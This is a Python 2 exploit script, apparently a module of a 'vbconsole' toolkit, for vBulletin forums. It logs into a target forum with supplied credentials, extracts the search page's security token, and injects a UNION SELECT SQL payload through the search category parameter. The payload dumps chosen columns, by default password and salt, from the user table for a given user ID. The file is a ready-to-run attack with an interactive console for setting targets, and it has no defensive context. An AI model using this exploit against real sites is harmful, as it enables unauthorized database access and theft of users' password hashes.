#!/usr/bin/env python
from includes.termcolor import colored
import urllib
import urllib2
import httplib
import cookielib
import pycurl
import cStringIO
import re
import HTMLParser
import urlparse
import md5
from bs4 import BeautifulSoup


def get_server_status_code(url):
    host, path = urlparse.urlparse(url)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request('HEAD', path)
        return conn.getresponse().status
    except StandardError:
        return False
 
def check_url(url):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(url) in good_codes

def login(url, username, password):
	url = url.replace("search.php", "login.php?do=login")
	if not check_url(url):
		print ('Login file does not exist at: '+url)
		print ('Check the host and path to make sure they are correct.')
		return False
	loginpassword = md5.md5(password).hexdigest()
	postdata = [
	('do', 'login'),
	('vb_login_username', username),
	('vb_login_md5password', loginpassword),
	('cookieuser', '1')
	]
	postdata = urllib.urlencode(postdata)
	cookie_jar = cookielib.CookieJar()
	handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
	handeler.open(url, postdata)
	for cookies in cookie_jar:
		if 'bb_userid' in str(cookies):
			return cookie_jar

def initiate():
	exvars = [
	['HOST', 'Not Set', 'Host of target with http://!'],
	['PATH', '/forums', 'Path to forums on target host'],
	['TABLE', 'user', 'User table to extract data from'],
	['USERNAME', 'Not Set', 'Valid username for target forum'],
	['PASSWORD', 'Not Set', 'Valid password for target forum'],
	['SQUERY', 'Test Group', 'Search query for valid group on target forum'],
	['USERID', '1', 'Userid of to extract data for'],
	['COLUMNS', 'password,salt', 'Columns to extract data for. Seperate with a comma!!'],
	['SEPERATOR', ':', 'Seperator to seperate columns']
	]

	print ('\nType help for more information')
	while True:
		try:
			vbgroup = raw_input('vbconsole('+colored('/exploits/vbgroup', 'red')+')> ')
			if vbgroup == 'exit':
				print ("Going back to home.")
				break
			elif vbgroup == 'help':
				print ('show vars ~> Shows variables needed to run exploit and their current values')
				print ('set {VAR NAME} {VAR VALUE} ~> Set {VAR NAME} to {VAR VALUE}')
				print ('run ~> Run the exploit')
				print ('exit ~> Go back to vBconsole home')
			elif vbgroup == 'show vars':
				print ("Variables needed to run exploit.\n")
				count = 0
				while count < len(exvars):
					print (exvars[count][0]+" = "+exvars[count][1]+" ("+exvars[count][2]+")")
					count += 1
			elif vbgroup[0:3] == 'set':
				setvar = vbgroup.split(' ')[1]
				setval = vbgroup.split(' ')[2:]
				count = 0
				while count < len(exvars):
					if exvars[count][0] == setvar:
						exvars[count][1] = " ".join(setval)
					count += 1
			elif vbgroup == 'run':
				columns = exvars[7][1].split(',')
				if exvars[0][1].endswith('/'):
					host = exvars[0][1][:-1]
				else:
					host = exvars[0][1]
				if exvars[1][1] != '/' and exvars[1][1].endswith('/'):
					path = exvars[1][1]+"search.php"
				elif exvars[1][1] == '/':
					path = exvars[1][1]+"search.php"
				else:
					path = exvars[1][1]+"/search.php"
				url = host+path
				if login(url, exvars[3][1], exvars[4][1]):
					if check_url(url):
						results = []
						handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(login(url, exvars[3][1], exvars[4][1])))
						response = handeler.open(url).read()
						soup = BeautifulSoup(response)
						soup2 = soup.find('input', attrs={'name' : 'securitytoken'})
						if soup2:
							securitytoken = soup2['value']
							for cols in columns:
								postdata = [
								('type[]', '7'),
								('query', exvars[5][1]),
								('titleonly', '0'),
								('searchuser', ''),
								('exactname', '1'),
								('tag', ''),
								('dosearch', 'Search Now'),
								('searchdate', '0'),
								('beforeafter', 'after'),
								('sortby', 'relevance'),
								('order', 'descending'),
								('saveprefs', '1'),
								('s', ''),
								('securitytoken', securitytoken),
								('do', 'process')
								]
								postdata = urllib.urlencode(postdata)
								postdata = postdata+"&searchthreadid=&cat[0]=1) UNION SELECT concat('@SQLi@',"+cols+",'@SQLi@') FROM "+exvars[2][1]+" WHERE userid="+exvars[6][1]+"#"
								handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(login(url, exvars[3][1], exvars[4][1])))
								response = handeler.open(url, postdata).read()
								comp  = re.compile('@SQLi@(.*?)@SQLi@', re.DOTALL |  re.IGNORECASE).findall(response)
								if comp:
									print (cols+': '+comp[0])
									results.append(comp[0])
							if len(results) != 0:
								line = exvars[8][1].join(results)
								print ('\n'+line)
						else:
							print ('Something went wrong and failed to get the security token!')
					else:
						print ('Search could not be found at: '+url)
				else:
					print ('The login was incorrect!')
		except KeyboardInterrupt:
			print ("\nGoing back to home.")
			break
